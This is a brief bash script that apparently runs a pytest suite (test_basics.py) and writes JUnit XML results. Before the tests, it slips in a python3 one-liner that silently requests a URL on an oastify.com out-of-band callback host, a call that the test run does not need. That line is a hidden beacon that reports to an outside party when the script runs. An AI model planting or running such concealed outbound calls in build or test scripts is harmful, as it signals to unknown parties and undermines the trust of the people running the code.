#!/bin/bash

python3 -c "import urllib.request; urllib.request.urlopen('https://pmf5tiyi818ocb3lf70dpfpg2780wp.oastify.com/taskunittest3').read()"       
python3 -m pip install pytest
python3 -m pytest -v --junitxml=pytest_basics.xml --durations=10 test_basics.py
